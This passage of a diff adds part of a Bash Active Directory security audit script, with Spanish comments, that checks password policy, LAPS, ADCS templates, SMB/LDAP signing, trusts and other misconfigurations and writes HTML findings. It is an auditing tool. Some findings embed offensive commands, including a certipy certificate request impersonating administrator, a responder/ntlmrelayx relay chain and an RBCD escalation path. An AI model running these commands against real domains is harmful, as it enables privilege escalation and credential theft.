+        "minPwdLength maxPwdAge minPwdAge lockoutThreshold pwdProperties" 2>/dev/null)
+
+    local min_len lockout_threshold pwd_props max_age
+    min_len=$(echo "$pso_data" | grep "^minPwdLength:" | awk '{print $2}' | tr -d '[:space:]')
+    lockout_threshold=$(echo "$pso_data" | grep "^lockoutThreshold:" | awk '{print $2}' | tr -d '[:space:]')
+    pwd_props=$(echo "$pso_data" | grep "^pwdProperties:" | awk '{print $2}' | tr -d '[:space:]')
+    max_age=$(echo "$pso_data" | grep "^maxPwdAge:" | awk '{print $2}' | tr -d '[:space:]')
+
+    local pwd_issues=()
+    (( ${min_len:-0} < 12 )) && pwd_issues+=("Longitud mínima = ${min_len:-?} (recomendado ≥ 12)")
+    [[ "${lockout_threshold:-0}" == "0" ]] && pwd_issues+=("Sin bloqueo por intentos fallidos (lockoutThreshold=0) → permite fuerza bruta")
+    (( ${lockout_threshold:-10} > 10 )) && pwd_issues+=("Bloqueo configurado en ${lockout_threshold} intentos (recomendado ≤ 5)")
+
+    local pwd_html="<table class='vuln-table'>"
+    pwd_html+="<tr><th>Parámetro</th><th>Valor</th><th>Estado</th></tr>"
+    pwd_html+="<tr><td>Longitud mínima</td><td>${min_len:-?}</td><td>$(( ${min_len:-0} >= 12 )) && echo '✅' || echo '⚠'</td></tr>"
+    pwd_html+="<tr><td>Bloqueo (intentos)</td><td>${lockout_threshold:-?}</td><td>$([[ "${lockout_threshold:-0}" == "0" ]] && echo '❌ Desactivado' || echo '✅')</td></tr>"
+    pwd_html+="</table>"
+
+    if (( ${#pwd_issues[@]} > 0 )); then
+        local issue_text=""
+        for issue in "${pwd_issues[@]}"; do issue_text+="<li>${issue}</li>"; done
+        pwd_html+="<ul>${issue_text}</ul>"
+
+        local pwd_sev="MEDIO"
+        [[ "${lockout_threshold:-0}" == "0" ]] && pwd_sev="ALTO"
+
+        _ad_finding "$pwd_sev" "Política de Contraseñas Débil" \
+            "$pwd_html" "6.5" \
+            "Configurar: minPwdLength ≥ 14, lockoutThreshold ≤ 5, lockoutDuration ≥ 30 min, pwdProperties incluir complejidad. Usar Fine-Grained Password Policies (PSO) para cuentas privilegiadas." \
+            "Get-ADDefaultDomainPasswordPolicy | Fine-Grained: Get-ADFineGrainedPasswordPolicy -Filter *"
+    else
+        _ad_ok "Política de contraseñas: configuración aceptable"
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 11: PASS-THE-HASH — LLMNR/NBT-NS (detectar configuración)
+    # CHECK 12: ADMINCOUNT=1 sin ser admin
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[11/35] AdminCount=1 en cuentas no administradoras (SDProp abuse)"
+    local admincount_data
+    admincount_data=$(_ldap "(&(objectClass=user)(adminCount=1)(!(memberOf=CN=Domain Admins,CN=Users,${AD_BASE_DN}))(!(memberOf=CN=Administrators,CN=Builtin,${AD_BASE_DN})))" \
+        "cn sAMAccountName" 2>/dev/null)
+    local admincount_num
+    admincount_num=$(echo "$admincount_data" | grep -c "^dn:" || echo 0)
+
+    if (( admincount_num > 0 )); then
+        _ad_warn "${admincount_num} cuentas con adminCount=1 sin ser admins actuales"
+        local ac_html="<p><b>${admincount_num} cuentas</b> tienen adminCount=1 pero no pertenecen a grupos admin actuales. Esto indica que fueron admins anteriormente y heredaron ACLs privilegiadas que NO se limpiaron (SDProp no revirtió los permisos).</p><ul>"
+        while IFS= read -r line; do
+            [[ "$line" =~ ^sAMAccountName:\ (.+) ]] && ac_html+="<li><code>${BASH_REMATCH[1]}</code></li>"
+        done <<< "$admincount_data"
+        ac_html+="</ul>"
+
+        _ad_finding "ALTO" "AdminCount=1 Sin Membresía Admin — ${admincount_num} Cuentas" \
+            "$ac_html" "7.5" \
+            "Resetear adminCount a 0 y corregir ACLs en el objeto. Limpiar ACEs huérfanas con: Get-ObjectAcl y Remove-ObjectAcl en PowerView." \
+            "Get-ADUser -LDAPFilter '(adminCount=1)' | Get-ObjectAcl -ResolveGUIDs | ?{_.ActiveDirectoryRights -match 'Write'}"
+    else
+        _ad_ok "adminCount consistente"
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 13: PASSWORD IN DESCRIPTION
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[12/35] Contraseñas en atributo Description"
+    local pwddesc_data
+    pwddesc_data=$(_ldap "(&(objectClass=user)(description=*pass*))" "cn sAMAccountName description" 2>/dev/null)
+    pwddesc_data+=$'\n'
+    pwddesc_data+=$(_ldap "(&(objectClass=user)(description=*pwd*))" "cn sAMAccountName description" 2>/dev/null)
+    pwddesc_data+=$'\n'
+    pwddesc_data+=$(_ldap "(&(objectClass=user)(description=*password*))" "cn sAMAccountName description" 2>/dev/null)
+
+    local pwddesc_count
+    pwddesc_count=$(echo "$pwddesc_data" | grep -c "^dn:" || echo 0)
+
+    if (( pwddesc_count > 0 )); then
+        _ad_crit "Posibles credenciales en campo Description: ${pwddesc_count} cuentas"
+        local pwddesc_html="<p>Cuentas con palabras clave de contraseña en su descripción:</p><ul>"
+        while IFS= read -r line; do
+            [[ "$line" =~ ^sAMAccountName:\ (.+) ]] && local sam_tmp="${BASH_REMATCH[1]}"
+            [[ "$line" =~ ^description:\ (.+) ]] && pwddesc_html+="<li><b>${sam_tmp}</b>: <code>${BASH_REMATCH[1]}</code></li>"
+        done <<< "$pwddesc_data"
+        pwddesc_html+="</ul>"
+
+        _ad_finding "CRÍTICO" "Contraseñas en Descripción de Cuentas AD" \
+            "$pwddesc_html" "9.0" \
+            "Eliminar inmediatamente contraseñas de los campos Description. Cambiar contraseñas expuestas. Auditar todos los atributos LDAP accesibles (info, comment, wWWHomePage)." \
+            "_ldap '(description=*pass*)' 'sAMAccountName description'"
+    else
+        _ad_ok "Sin contraseñas en Description"
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 14: DCSYNC RIGHTS (usuarios con replication permissions)
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[13/35] DCSync — Permisos de replicación en usuarios no-DC"
+    # Buscar ACEs con DS-Replication-Get-Changes en el objeto dominio
+    local dcsync_check
+    dcsync_check=$(python3 - << 'PYDCSYNC' 2>/dev/null
+import subprocess
+# Check who has Replicating Directory Changes permission via ldapsearch
+# The GUID for DS-Replication-Get-Changes is 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
+result = subprocess.run([
+    'ldapsearch', '-x', '-LLL',
+    '-H', f'ldap://${AD_DC_IP}:389',
+    '-D', '${AD_USER_FULL}',
+    '-w', '${AD_PASS}',
+    '-b', '${AD_BASE_DN}',
+    '-s', 'base',
+    '(objectClass=*)', 'nTSecurityDescriptor'
+], capture_output=True, text=True, timeout=15)
+# If we can't parse SD, just note the limitation
+if result.returncode == 0:
+    print("ACCESSIBLE")
+else:
+    print("DENIED")
+PYDCSYNC
+)
+
+    if [[ "$dcsync_check" == "ACCESSIBLE" ]]; then
+        _ad_warn "Verificar permisos DCSync manualmente (requiere análisis de ACL)"
+        _ad_finding "INFO" "DCSync — Verificación Manual Requerida" \
+            "<p>Los permisos DCSync (DS-Replication-Get-Changes-All) deben verificarse con BloodHound o PowerView ya que requieren parseo del Security Descriptor binario.</p>
+            <code>Get-ObjectAcl -DistinguishedName '${AD_BASE_DN}' -ResolveGUIDs | ?{\\$_.ObjectAceType -match 'Replication'}</code>" \
+            "N/A" \
+            "Solo Domain Controllers y administradores delegados deben tener permisos de replicación." \
+            "bloodhound-python -u ${AD_USER} -p '${AD_PASS}' -d ${AD_DOMAIN_FQDN} -c DCOnly"
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 15: LAPS — Local Admin Password Solution
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[14/35] LAPS — Local Administrator Password Solution"
+    local laps_data
+    laps_data=$(_ldap "(objectClass=computer)" "ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime cn" 2>/dev/null)
+    local total_computers laps_computers
+    total_computers=$(echo "$laps_data" | grep -c "^dn:" || echo 0)
+    laps_computers=$(echo "$laps_data" | grep -c "^ms-Mcs-AdmPwd:" || echo 0)
+
+    local laps_readable
+    laps_readable=$(echo "$laps_data" | grep "^ms-Mcs-AdmPwd:" | grep -v "^ms-Mcs-AdmPwd: $" | wc -l)
+
+    if (( total_computers > 0 && laps_computers == 0 )); then
+        _ad_crit "LAPS NO instalado en ninguno de los ${total_computers} equipos"
+        _ad_finding "ALTO" "LAPS No Implementado — ${total_computers} Equipos Sin Protección" \
+            "<p>LAPS (Local Administrator Password Solution) <b>no está instalado</b>. Todos los equipos probablemente comparten la misma contraseña de administrador local, lo que permite movimiento lateral masivo tras comprometer un equipo.</p>
+            <p><b>Total equipos:</b> ${total_computers}</p>" \
+            "8.0" \
+            "Implementar LAPS o Windows LAPS (nativo en Windows Server 2022/Windows 11 22H2+). Configurar GPO para rotación automática de contraseñas." \
+            "Install-Module LAPS | Get-LAPSComputers | find /v '' %windir%\\system32\\drivers\\Microsoft\\\\LocalAdministratorPasswordSolution.dll"
+    elif (( laps_readable > 0 )); then
+        _ad_warn "${laps_readable} contraseñas LAPS son LEGIBLES por el usuario actual"
+        _ad_finding "ALTO" "Contraseñas LAPS Legibles — ${laps_readable} Equipos" \
+            "<p>El usuario <b>${AD_USER}</b> puede leer contraseñas LAPS de ${laps_readable} equipos. Esto puede ser excesivo si el usuario no es admin delegado.</p>" \
+            "7.5" \
+            "Revisar ACLs sobre ms-Mcs-AdmPwd. Solo admins IT y cuentas de helpdesk deben poder leer LAPS passwords." \
+            "Find-AdmPwdExtendedRights -Identity '${AD_BASE_DN}'"
+    else
+        _ad_ok "LAPS instalado y contraseñas protegidas"
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 16-19: ADCS — Active Directory Certificate Services
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[15/35] ADCS — Certificate Templates vulnerables (ESC1-ESC8)"
+    local adcs_base="CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,${AD_BASE_DN}"
+
+    # ESC1: Template con enrollee supplies subject + clientAuth EKU
+    local esc1_data
+    esc1_data=$(ldapsearch -x -LLL \
+        -H "ldap://${AD_DC_IP}:389" \
+        -D "${AD_USER_FULL}" \
+        -w "${AD_PASS}" \
+        -b "${adcs_base}" \
+        "(&(objectClass=pKICertificateTemplate)(msPKI-Certificate-Name-Flag:1.2.840.113556.1.4.803:=1)(msPKI-Enrollment-Flag:1.2.840.113556.1.4.803:=2))" \
+        "cn msPKI-Certificate-Name-Flag msPKI-RA-Signature pKIExtendedKeyUsage" 2>/dev/null)
+
+    local esc1_count
+    esc1_count=$(echo "$esc1_data" | grep -c "^dn:" || echo 0)
+
+    if (( esc1_count > 0 )); then
+        _ad_crit "ESC1: ${esc1_count} templates ADCS vulnerables a impersonation"
+        local esc1_html="<p><b>ESC1 — Enrollee Supplies Subject + Client Auth:</b> Un atacante puede solicitar un certificado con cualquier SAN (Subject Alternative Name), incluyendo Domain Admin, para autenticarse como cualquier usuario.</p>"
+        esc1_html+="<ul>"
+        while IFS= read -r line; do
+            [[ "$line" =~ ^cn:\ (.+) ]] && {
+                AD_ADCS_TEMPLATES+=("ESC1:${BASH_REMATCH[1]}")
+                esc1_html+="<li>Template: <b>${BASH_REMATCH[1]}</b></li>"
+            }
+        done <<< "$esc1_data"
+        esc1_html+="</ul>"
+        esc1_html+="<p><code>certipy req -u USER@${AD_DOMAIN_FQDN} -p PASS -ca CA-NAME -template TEMPLATE -upn administrator@${AD_DOMAIN_FQDN} -dc-ip ${AD_DC_IP}</code></p>"
+
+        _ad_finding "CRÍTICO" "ADCS ESC1 — ${esc1_count} Templates Vulnerables" \
+            "$esc1_html" "9.8" \
+            "Deshabilitar CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT en los templates (msPKI-Certificate-Name-Flag). Si es necesario para uso legítimo, requerir aprobación de CA (CA Manager Approval)." \
+            "certipy find -u ${AD_USER}@${AD_DOMAIN_FQDN} -p '${AD_PASS}' -dc-ip ${AD_DC_IP} -vulnerable -stdout"
+    else
+        _ad_ok "ADCS ESC1: sin templates vulnerables"
+    fi
+
+    # ESC2 y ESC3 detection (Any Purpose EKU)
+    _ad_log "[16/35] ADCS ESC2/ESC3 — Any Purpose EKU"
+    local esc2_data
+    esc2_data=$(ldapsearch -x -LLL \
+        -H "ldap://${AD_DC_IP}:389" \
+        -D "${AD_USER_FULL}" \
+        -w "${AD_PASS}" \
+        -b "${adcs_base}" \
+        "(&(objectClass=pKICertificateTemplate)(pKIExtendedKeyUsage=2.5.29.37.0))" \
+        "cn pKIExtendedKeyUsage" 2>/dev/null)
+    local esc2_count
+    esc2_count=$(echo "$esc2_data" | grep -c "^dn:" || echo 0)
+
+    if (( esc2_count > 0 )); then
+        _ad_crit "ESC2: ${esc2_count} templates con Any Purpose EKU"
+        local esc2_html="<p><b>ESC2</b> — Templates con <b>Any Purpose EKU</b> (2.5.29.37.0). Permite usar el certificado para autenticación de cliente aunque no esté declarado explícitamente.</p>"
+        while IFS= read -r line; do
+            [[ "$line" =~ ^cn:\ (.+) ]] && {
+                AD_ADCS_TEMPLATES+=("ESC2:${BASH_REMATCH[1]}")
+                esc2_html+="<li>Template: <b>${BASH_REMATCH[1]}</b></li>"
+            }
+        done <<< "$esc2_data"
+
+        _ad_finding "CRÍTICO" "ADCS ESC2 — Any Purpose EKU en ${esc2_count} Templates" \
+            "$esc2_html" "9.5" \
+            "Eliminar el OID 2.5.29.37.0 de pKIExtendedKeyUsage. Reemplazar con EKUs específicos necesarios." \
+            "certipy find -u ${AD_USER}@${AD_DOMAIN_FQDN} -p '${AD_PASS}' -dc-ip ${AD_DC_IP} -vulnerable"
+    else
+        _ad_ok "ADCS ESC2: sin templates Any Purpose"
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 17: GUEST ACCOUNT HABILITADO
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[17/35] Cuenta Guest habilitada"
+    local guest_data
+    guest_data=$(_ldap "(&(objectClass=user)(cn=Guest)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
+        "cn userAccountControl" 2>/dev/null)
+
+    if echo "$guest_data" | grep -q "^dn:"; then
+        _ad_crit "Cuenta Guest HABILITADA"
+        _ad_finding "ALTO" "Cuenta Guest Habilitada en el Dominio" \
+            "<p>La cuenta <b>Guest</b> está habilitada. Esta cuenta permite acceso anónimo básico y es frecuentemente usada en ataques de reconocimiento inicial.</p>" \
+            "7.0" \
+            "Deshabilitar la cuenta Guest: Disable-ADAccount -Identity Guest" \
+            "Disable-ADAccount -Identity 'Guest' -Server ${AD_DC_IP}"
+    else
+        _ad_ok "Cuenta Guest deshabilitada (correcto)"
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 18: SMB SIGNING (requiere nmap si disponible)
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[18/35] SMB Signing — Protección contra NTLM Relay"
+    if command -v nmap >/dev/null 2>&1; then
+        local smb_signing
+        smb_signing=$(nmap -p 445 --script smb2-security-mode "${AD_DC_IP}" 2>/dev/null | \
+            grep -i "message signing")
+
+        if echo "$smb_signing" | grep -qi "required"; then
+            _ad_ok "SMB Signing requerido en DC (correcto)"
+        elif echo "$smb_signing" | grep -qi "enabled but not required"; then
+            _ad_crit "SMB Signing habilitado pero NO requerido → NTLM Relay posible"
+            _ad_finding "CRÍTICO" "SMB Signing No Requerido — NTLM Relay Attack" \
+                "<p>SMB Signing está habilitado pero no es obligatorio. Esto permite ataques <b>NTLM Relay</b> (responder + ntlmrelayx) para comprometer equipos sin crackear hashes.</p>
+                <p>Resultado nmap: <code>${smb_signing}</code></p>" \
+                "9.0" \
+                "GPO: Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options → 'Microsoft network server: Digitally sign communications (always)' = Enabled" \
+                "nmap --script smb2-security-mode -p 445 ${AD_DC_IP} | responder -I eth0 -rdw + ntlmrelayx.py -smb2support -t smb://${AD_DC_IP}"
+        fi
+    else
+        _ad_log "nmap no disponible, verificar SMB Signing manualmente"
+        _ad_finding "INFO" "SMB Signing — Verificación Manual" \
+            "<p>nmap no disponible. Verificar manualmente con: <code>nmap -p445 --script smb2-security-mode ${AD_DC_IP}</code></p>" \
+            "N/A" "Instalar nmap para verificación automática." \
+            "nmap -p 445 --script smb2-security-mode ${AD_DC_IP}"
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 19: LDAP SIGNING / CHANNEL BINDING
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[19/35] LDAP Signing — Channel Binding"
+    local ldap_no_sign
+    ldap_no_sign=$(ldapsearch -x -LLL \
+        -H "ldap://${AD_DC_IP}:389" \
+        -D "${AD_USER_FULL}" \
+        -w "${AD_PASS}" \
+        -b "" \
+        -s base \
+        "(objectClass=*)" supportedCapabilities 2>&1)
+
+    # Si podemos conectar sin SSL en puerto 389 con credenciales en claro → signing débil
+    if echo "$ldap_no_sign" | grep -qi "supportedCapabilities\|supported"; then
+        _ad_warn "LDAP en puerto 389 acepta autenticación sin signing"
+        _ad_finding "MEDIO" "LDAP Signing No Enforced — Posible LDAP Relay" \
+            "<p>El servidor acepta autenticación LDAP en texto claro (puerto 389) sin requerir LDAP Signing. Esto puede permitir ataques de LDAP Relay.</p>
+            <p>Verificar con: <code>LdapRelayScan.py -u ${AD_USER} -p PASS -d ${AD_DC_IP}</code></p>" \
+            "6.5" \
+            "Configurar LDAP Signing requerido: Group Policy → Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options → 'Domain controller: LDAP server signing requirements' = Require signing" \
+            "LdapRelayScan.py -method BOTH -u ${AD_USER} -p '${AD_PASS}' ${AD_DC_IP}"
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 20: USUARIOS EN GRUPO PROTEGIDO (Protected Users)
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[20/35] Protected Users group — cuentas privilegiadas sin protección"
+    local protusers_data
+    protusers_data=$(_ldap "(cn=Protected Users)" "member" 2>/dev/null)
+    local prot_members
+    prot_members=$(echo "$protusers_data" | grep -c "^member:")
+
+    local da_count="${#AD_DA_MEMBERS[@]}"
+    if (( prot_members < da_count )); then
+        _ad_warn "Solo ${prot_members} en Protected Users pero hay más admins"
+        _ad_finding "MEDIO" "Cuentas Privilegiadas Fuera de Protected Users" \
+            "<p>El grupo <b>Protected Users</b> tiene solo <b>${prot_members} miembros</b>. Todos los Domain Admins y cuentas de Tier-0 deberían estar aquí para prevenir Pass-the-Hash, Pass-the-Ticket, y delegación de credenciales.</p>
+            <p><b>Beneficios del grupo:</b> Sin NTLM, sin DES/RC4 Kerberos, sin unconstrained delegation, Kerberos tickets TTL máximo 4h.</p>" \
+            "6.0" \
+            "Agregar todos los Domain Admins al grupo Protected Users. Probar antes en staging ya que rompe algunas aplicaciones legadas que usan NTLM." \
+            "Add-ADGroupMember -Identity 'Protected Users' -Members (Get-ADGroupMember 'Domain Admins').SamAccountName"
+    else
+        _ad_ok "Protected Users group correctamente poblado"
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 21: DOMAIN TRUSTS — relaciones de confianza
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[21/35] Domain Trusts — Relaciones de confianza"
+    local trust_data
+    trust_data=$(_ldap "(objectClass=trustedDomain)" \
+        "cn trustDirection trustType trustAttributes flatName" 2>/dev/null)
+    local trust_count
+    trust_count=$(echo "$trust_data" | grep -c "^dn:" || echo 0)
+
+    if (( trust_count > 0 )); then
+        local trust_html="<p><b>${trust_count} trust(s)</b> configurados:</p><table class='vuln-table'><tr><th>Dominio</th><th>Dirección</th><th>Tipo</th><th>Atributos</th></tr>"
+        local cn="" direction="" ttype="" tattrs=""
+        while IFS= read -r line; do
+            [[ "$line" =~ ^cn:\ (.+)  ]]              && cn="${BASH_REMATCH[1]}"
+            [[ "$line" =~ ^trustDirection:\ (.+) ]]   && direction="${BASH_REMATCH[1]}"
+            [[ "$line" =~ ^trustType:\ (.+) ]]         && ttype="${BASH_REMATCH[1]}"
+            [[ "$line" =~ ^trustAttributes:\ (.+) ]]  && tattrs="${BASH_REMATCH[1]}"
+            [[ "$line" =~ ^flatName:\ (.+) ]] && {
+                # Calcular riesgo del trust
+                local trust_risk="✅"
+                # direction: 1=inbound, 2=outbound, 3=bidirectional
+                [[ "$direction" == "3" ]] && trust_risk="⚠ Bidireccional"
+                # 8 = TREAT_AS_EXTERNAL, 32 = ENABLE_TGT_DELEGATION
+                (( (${tattrs:-0} & 32) > 0 )) && trust_risk="❌ TGT Delegation activo"
+                trust_html+="<tr><td>${cn}</td><td>${direction} ($(( direction==3 )) && echo 'Bidireccional' || echo 'Unidireccional')</td><td>${ttype}</td><td>${tattrs} ${trust_risk}</td></tr>"
+            }
+        done <<< "$trust_data"
+        trust_html+="</table>"
+
+        local trust_sev="INFO"
+        echo "$trust_data" | grep "trustAttributes:" | awk '{print $2}' | while read -r ta; do
+            (( (${ta:-0} & 32) > 0 )) && trust_sev="ALTO" && break
+        done
+
+        _ad_finding "${trust_sev}" "Domain Trusts — ${trust_count} Relaciones Detectadas" \
+            "$trust_html" "6.5" \
+            "Auditar todos los trusts. Eliminar trusts innecesarios. Evitar TGT Delegation en trusts externos. Usar SID Filtering en todos los trusts externos." \
+            "impacket-GetDomainTrusts ${AD_DOMAIN_FQDN}/${AD_USER}:'${AD_PASS}' -dc-ip ${AD_DC_IP}"
+    else
+        _ad_ok "Sin domain trusts configurados"
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 22: GPOs — Objetos de política con permisos débiles
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[22/35] GPOs — Enumeración y permisos"
+    local gpo_data
+    gpo_data=$(_ldap "(objectClass=groupPolicyContainer)" \
+        "cn displayName gPCFileSysPath" 2>/dev/null)
+    local gpo_count
+    gpo_count=$(echo "$gpo_data" | grep -c "^dn:" || echo 0)
+
+    _ad_finding "INFO" "GPOs — ${gpo_count} Políticas Detectadas" \
+        "<p>Se detectaron <b>${gpo_count} GPOs</b> en el dominio. Verificar manualmente permisos de escritura en GPOs con BloodHound o PowerView.</p>
+        <p>GPOs con <i>Write</i> para usuarios no-admin = escalada a DA.</p>
+        <p>Exportado en: <code>${AD_OUT_DIR}/gpos.txt</code></p>" \
+        "N/A" \
+        "Revisar permisos de GPOs: Get-GPPermission -All -GUID * | ?{\\$_.Permission -eq 'GpoEditDeleteModifySecurity'}" \
+        "bloodhound: GPO → 'GPOs where X can modify' | PowerView: Get-GPPermission"
+    echo "$gpo_data" > "${AD_OUT_DIR}/gpos.txt"
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 23: PASSWORD SPRAY PROTECTION — Fine-Grained Policies
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[23/35] Fine-Grained Password Policies (PSO)"
+    local pso_data2
+    pso_data2=$(_ldap "(objectClass=msDS-PasswordSettings)" \
+        "cn msDS-LockoutThreshold msDS-MinimumPasswordLength msDS-PasswordSettingsPrecedence" 2>/dev/null)
+    local pso_count
+    pso_count=$(echo "$pso_data2" | grep -c "^dn:" || echo 0)
+
+    if (( pso_count == 0 )); then
+        _ad_finding "BAJO" "Sin Fine-Grained Password Policies (PSO)" \
+            "<p>No hay políticas de contraseñas granulares configuradas. Las cuentas privilegiadas deberían tener una PSO con requisitos más estrictos que la política de dominio por defecto.</p>" \
+            "3.0" \
+            "Crear PSOs para: Domain Admins (longitud ≥20, bloqueo a los 3 intentos), Service Accounts (contraseñas >25 chars, sin expiración + monitoreo de uso)." \
+            "New-ADFineGrainedPasswordPolicy -Name 'AdminPSO' -Precedence 1 -MinPasswordLength 20 -LockoutThreshold 3"
+    else
+        _ad_ok "${pso_count} Fine-Grained Password Policies configuradas"
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 24: CUENTAS CON HISTORIAL DE CONTRASEÑAS CORTO
+    # CHECK 25: DOMINIO EN MODO FUNCIONAL ANTIGUO
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[24/35] Nivel funcional del dominio"
+    local func_level_data
+    func_level_data=$(_ldap "(objectClass=domainDNS)" "msDS-Behavior-Version domainFunctionality" 2>/dev/null)
+    local func_level
+    func_level=$(echo "$func_level_data" | grep -E "^msDS-Behavior-Version:|^domainFunctionality:" | awk '{print $2}' | head -1)
+
+    # Niveles: 0=2000, 1=2003, 2=2003, 3=2008, 4=2008R2, 5=2012, 6=2012R2, 7=2016, 10=2025
+    if (( ${func_level:-7} < 5 )); then
+        _ad_warn "Nivel funcional antiguo: ${func_level} (< Windows Server 2012)"
+        _ad_finding "MEDIO" "Nivel Funcional del Dominio Obsoleto (${func_level})" \
+            "<p>El dominio opera en nivel funcional <b>${func_level}</b>. Los niveles bajos deshabilitan funciones de seguridad modernas como Protected Users group, Authentication Policies, y claims-based access control.</p>
+            <table class='vuln-table'><tr><th>Nivel</th><th>Windows Server</th><th>Estado</th></tr>
+            <tr><td>0-3</td><td>2000-2008</td><td style='color:#ff2d2d'>❌ Crítico</td></tr>
+            <tr><td>4-5</td><td>2008R2-2012</td><td style='color:#ff6b35'>⚠ Obsoleto</td></tr>
+            <tr><td>6-7</td><td>2012R2-2016</td><td style='color:#ffd23f'>~ Aceptable</td></tr>
+            <tr><td>10</td><td>2025</td><td style='color:#3fb950'>✅ Actual</td></tr></table>" \
+            "5.0" \
+            "Elevar nivel funcional del dominio. Requiere que todos los DCs estén en la versión objetivo." \
+            "Set-ADDomainMode -Identity ${AD_DOMAIN_FQDN} -DomainMode Windows2016Domain"
+    else
+        _ad_ok "Nivel funcional del dominio: ${func_level} (moderno)"
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 26: CUENTAS DE MÁQUINA (Excessive Machine Account Quota)
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[25/35] ms-DS-MachineAccountQuota — Creación de cuentas de máquina"
+    local maq_data
+    maq_data=$(_ldap "(objectClass=domainDNS)" "ms-DS-MachineAccountQuota" 2>/dev/null)
+    local maq_value
+    maq_value=$(echo "$maq_data" | grep "^ms-DS-MachineAccountQuota:" | awk '{print $2}')
+
+    if (( ${maq_value:-10} > 0 )); then
+        _ad_warn "ms-DS-MachineAccountQuota = ${maq_value:-10} → cualquier usuario puede unir equipos al dominio"
+        _ad_finding "ALTO" "MachineAccountQuota = ${maq_value:-10} — RBCD / Resource-Based Constrained Delegation" \
+            "<p>El valor <b>ms-DS-MachineAccountQuota = ${maq_value:-10}</b> permite que cualquier usuario autenticado cree hasta ${maq_value:-10} cuentas de máquina en el dominio.</p>
+            <p><b>Impacto:</b> En combinación con un equipo vulnerable a RBCD, permite escalada de privilegios completa sin necesidad de comprometer ninguna cuenta de servicio.</p>
+            <p><b>Ataque:</b> impacket-addcomputer → impacket-rbcd → impacket-getST → Pass-the-Ticket → DA</p>" \
+            "8.5" \
+            "Configurar ms-DS-MachineAccountQuota = 0. Usar cuentas delegadas específicas para unir equipos al dominio." \
+            "Set-ADDomain -Identity ${AD_DOMAIN_FQDN} -Replace @{'ms-DS-MachineAccountQuota'='0'}"
+    else
+        _ad_ok "ms-DS-MachineAccountQuota = 0 (correcto)"
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 27-28: GROUPS — Generic All / Write sobre objetos sensibles
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[26/35] Grupos nested peligrosos"
+    local nested_html="<p>Grupos que contienen otros grupos con acceso a recursos críticos:</p><ul>"
+    local nested_found=false
+
+    # Buscar grupos que sean miembros de Domain Admins (grupos dentro de grupos = escalada)
+    local nested_data
+    nested_data=$(_ldap "(&(objectClass=group)(memberOf=CN=Domain Admins,CN=Users,${AD_BASE_DN}))" \
+        "cn distinguishedName" 2>/dev/null)
+
+    if echo "$nested_data" | grep -q "^dn:"; then
+        nested_found=true
+        while IFS= read -r line; do
+            [[ "$line" =~ ^cn:\ (.+) ]] && nested_html+="<li>Grupo <b>${BASH_REMATCH[1]}</b> es miembro de Domain Admins</li>"
+        done <<< "$nested_data"
+    fi
+    nested_html+="</ul>"
+
+    if [[ "$nested_found" == "true" ]]; then
+        _ad_finding "ALTO" "Grupos Nested en Domain Admins Detectados" \
+            "$nested_html" "7.5" \
+            "Domain Admins no debería contener grupos, solo usuarios directos. Aplanar la membresía y eliminar grupos anidados." \
+            "Get-ADGroupMember 'Domain Admins' -Recursive | ?{\\$_.objectClass -eq 'group'}"
+    else
+        _ad_ok "Sin grupos nested peligrosos en Domain Admins"
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 29: CUENTAS ADMINISTRATIVAS QUE USAN EMAIL CORPORATIVO
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[27/35] Separación de cuentas admin vs cuentas de usuario"
+    local da_with_email
+    da_with_email=$(_ldap "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,${AD_BASE_DN})(mail=*))" \
+        "cn sAMAccountName mail" 2>/dev/null)
+    local dae_count
+    dae_count=$(echo "$da_with_email" | grep -c "^dn:" || echo 0)
+
+    if (( dae_count > 0 )); then
+        _ad_warn "${dae_count} Domain Admins tienen email asociado (posible cuenta dual-use)"
+        _ad_finding "MEDIO" "Domain Admins Con Email — Posible Cuenta Dual-Use" \
+            "<p><b>${dae_count} cuentas de Domain Admin</b> tienen dirección de email configurada, lo que sugiere que se usan para trabajo diario Y tareas administrativas.</p>
+            <p><b>Riesgo:</b> Phishing, credential stuffing y browser-based attacks pueden comprometer credenciales de DA directamente.</p>" \
+            "6.0" \
+            "Separar cuentas: cuenta normal (correo, navegación) + cuenta admin dedicada (solo para tareas admin, sin email, sin internet). Implementar PAW (Privileged Access Workstations)." \
